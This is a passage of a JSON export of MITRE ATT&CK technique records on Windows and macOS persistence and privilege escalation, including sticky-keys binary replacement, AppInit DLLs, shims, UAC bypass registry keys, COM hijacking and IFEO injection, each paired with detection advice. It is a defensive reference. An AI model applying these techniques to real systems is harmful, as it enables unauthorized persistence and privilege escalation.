features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.<\/p>\n<p>Two common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe<\/code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe<\/code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as &quot;sticky keys&quot;, and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)<\/p>\n<p>Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers\/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\<\/code>, and it must be protected by Windows File or Resource Protection (WFP\/WRP). (Citation: DEFCON2016 Sticky Keys) The <a href=\"https:\/\/attack.mitre.org\/techniques\/T1546\/012\">Image File Execution Options Injection<\/a> debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.<\/p>\n<p>For simple binary replacement on Windows XP and later as well as and Windows Server 2003\/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe<\/code>) may be replaced with &quot;cmd.exe&quot; (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\/001\">Remote Desktop Protocol<\/a> will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)<\/p>\n<p>Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)<\/p>\n<ul>\n<li>On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe<\/code><\/li>\n<li>Magnifier: <code>C:\\Windows\\System32\\Magnify.exe<\/code><\/li>\n<li>Narrator: <code>C:\\Windows\\System32\\Narrator.exe<\/code><\/li>\n<li>Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe<\/code><\/li>\n<li>App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe<\/code><\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options<\/code>.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":498,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":502,"name":"T1546.009 - AppCert DLLs","sort_id":0,"external_id":"T1546.009","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may establish persistence and\/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs<\/code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\<\/code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess<\/code>, <code>CreateProcessAsUser<\/code>, <code>CreateProcessWithLoginW<\/code>, <code>CreateProcessWithTokenW<\/code>, or <code>WinExec<\/code>. (Citation: Endgame Process Injection July 2017)<\/p>\n<p>Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\">Process Injection<\/a>, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. (Citation: Endgame Process Injection July 2017) \n\nTools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location. (Citation: TechNet Autoruns) (Citation: Sysinternals AppCertDlls Oct 2007)\n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":502,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":503,"name":"T1546.010 - AppInit DLLs","sort_id":0,"external_id":"T1546.010","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may establish persistence and\/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs<\/code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows<\/code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows<\/code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Endgame Process Injection July 2017)<\/p>\n<p>Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. <\/p>\n<p>The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process. Monitor the AppInit_DLLs Registry values for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx<\/code> and <code>RegSetValueEx<\/code>. (Citation: Endgame Process Injection July 2017)\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current AppInit DLLs. (Citation: TechNet Autoruns) \n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":503,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":507,"name":"T1546.011 - Application Shimming","sort_id":0,"external_id":"T1546.011","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may establish persistence and\/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure\/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Endgame Process Injection July 2017)<\/p>\n<p>Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. <\/p>\n<p>A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:<\/p>\n<ul>\n<li><code>%WINDIR%\\AppPatch\\sysmain.sdb<\/code> and<\/li>\n<li><code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb<\/code><\/li>\n<\/ul>\n<p>Custom databases are stored in:<\/p>\n<ul>\n<li><code>%WINDIR%\\AppPatch\\custom &amp; %WINDIR%\\AppPatch\\AppPatch64\\Custom<\/code> and<\/li>\n<li><code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom<\/code><\/li>\n<\/ul>\n<p>To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1548\/002\">Bypass User Access Control<\/a> (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).<\/p>\n<p>Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"There are several public tools available that will detect shims that are currently available (Citation: Black Hat 2015 App Shim):\n\n* Shim-Process-Scanner - checks memory of every running process for any shim flags\n* Shim-Detector-Lite - detects installation of custom shim databases\n* Shim-Guard - monitors registry for any shim installations\n* ShimScanner - forensic tool to find active shims in memory\n* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)\n\nMonitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":507,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":523,"name":"T1548.002 - Bypass User Access Control","sort_id":0,"external_id":"T1548.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)<\/p>\n<p>If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated <a href=\"https:\/\/attack.mitre.org\/techniques\/T1559\/001\">Component Object Model<\/a> objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1218\/011\">Rundll32<\/a> to load a specifically crafted DLL which loads an auto-elevated <a href=\"https:\/\/attack.mitre.org\/techniques\/T1559\/001\">Component Object Model<\/a> object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)<\/p>\n<p>Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:<\/p>\n<ul>\n<li><code>eventvwr.exe<\/code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)<\/li>\n<\/ul>\n<p>Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https:\/\/attack.mitre.org\/techniques\/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https:\/\/attack.mitre.org\/techniques\/T1574\/001), which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:\n\n* The <code>eventvwr.exe<\/code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command<\/code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)\n\n* The <code>sdclt.exe<\/code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe<\/code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand<\/code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)\n\nAnalysts should monitor these Registry settings for unauthorized changes.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":523,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":527,"name":"T1546.001 - Change Default File Association","sort_id":0,"external_id":"T1546.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.<\/p>\n<p>System file associations are listed under <code>HKEY_CLASSES_ROOT.[extension]<\/code>, for example <code>HKEY_CLASSES_ROOT.txt<\/code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT[handler]<\/code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT[handler]\\shell[action]\\command<\/code>. For example: <\/p>\n<ul>\n<li><code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command<\/code><\/li>\n<li><code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command<\/code><\/li>\n<li><code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command<\/code><\/li>\n<\/ul>\n<p>The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Collect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process.\n\nUser file association preferences are stored under <code> [HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts<\/code> and override associations configured under <code>[HKEY_CLASSES_ROOT]<\/code>. Changes to a user's preference will occur under this entry's subkeys.\n\nAlso look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":527,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":541,"name":"T1546.015 - Component Object Model Hijacking","sort_id":0,"external_id":"T1546.015","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. <\/p>\n<p>Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: [Reg](https:\/\/attack.mitre.org\/software\/S0075)) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\.(Citation: Endgame COM Hijacking) Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.  \n\nLikewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed. ","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":541,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":588,"name":"T1548.004 - Elevated Execution with Prompt","sort_id":0,"external_id":"T1548.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges<\/code> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. <\/p>\n<p>Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.<\/p>\n<p>Adversaries may abuse <code>AuthorizationExecuteWithPrivileges<\/code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\">Masquerading<\/a> to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Consider monitoring for <code>\/usr\/libexec\/security_authtrampoline<\/code> executions which may indicate that <code>AuthorizationExecuteWithPrivileges<\/code> is being executed. MacOS system logs may also indicate when <code>AuthorizationExecuteWithPrivileges<\/code> is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":588,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":591,"name":"T1546.014 - Emond","sort_id":0,"external_id":"T1546.014","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1543\/004\">Launch Daemon<\/a> that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>\/sbin\/emond<\/code> will load any rules from the <code>\/etc\/emond.d\/rules\/<\/code> directory and take action once an explicitly defined event takes place.<\/p>\n<p>The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>\/private\/var\/db\/emondClients<\/code>, specified in the <a href=\"https:\/\/attack.mitre.org\/techniques\/T1543\/004\">Launch Daemon<\/a> configuration file at<code>\/System\/Library\/LaunchDaemons\/com.apple.emond.plist<\/code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)<\/p>\n<p>Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the <a href=\"https:\/\/attack.mitre.org\/techniques\/T1543\/004\">Launch Daemon<\/a> service.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor emond rules creation by checking for files created or modified in <code>\/etc\/emond.d\/rules\/<\/code> and <code>\/private\/var\/db\/emondClients<\/code>.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":591,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":594,"name":"T1546 - Event Triggered Execution","sort_id":0,"external_id":"T1546","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may establish persistence and\/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications\/binaries. <\/p>\n<p>Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create\/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked. <\/p>\n<p>Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring for additions or modifications of mechanisms that could be used to trigger event-based execution, especially the addition of abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network. Also look for changes that do not line up with updates, patches, or other planned administrative activity. \n\nThese mechanisms may vary by OS, but are typically stored in central repositories that store configuration information such as the Windows Registry, Common Information Model (CIM), and\/or specific named files, the last of which can be hashed and compared to known good values. \n\nMonitor for processes, API\/System calls, and other common ways of manipulating these event repositories. \n\nTools such as Sysinternals Autoruns can be used to detect changes to execution triggers that could be attempts at persistence. Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.  \n\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":594,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":594,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":594,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":622,"name":"T1546.012 - Image File Execution Options Injection","sort_id":0,"external_id":"T1546.012","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may establish persistence and\/or elevate privileges by executing malicious content triggered by Image File Execution Options (IEFO) debuggers. IEFOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe<\/code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)<\/p>\n<p>IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger<\/code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable><\/code> where <code>&lt;executable&gt;<\/code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)<\/p>\n<p>IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and\/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\<\/code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)<\/p>\n<p>Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1546\/008\">Accessibility Features<\/a>, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures &quot;cmd.exe,&quot; or another program that provides backdoor access, as a &quot;debugger&quot; for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\/001\">Remote Desktop Protocol<\/a> will cause the &quot;debugger&quot; program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)<\/p>\n<p>Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\">Process Injection<\/a>, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.<\/p>\n<p>Malware may also use IFEO to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1562\">Impair Defenses<\/a> by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for abnormal usage of the Glfags tool as well as common processes spawned under abnormal parents and\/or with creation flags indicative of debugging such as <code>DEBUG_PROCESS<\/code> and <code>DEBUG_ONLY_THIS_PROCESS<\/code>. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nMonitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx<\/code> and <code>RegSetValueEx<\/code>. (Citation: Endgame Process Injection July 2017)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":622,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":638,"name":"T1546.006 - LC_LOAD_DYLIB Addition","sort_id":0,"external_id":"T1546.006","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. (Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.<\/p>\n<p>Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019t checked at load time. (Citation: Malware Persistence on OS X)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes for those that may be used to modify binary 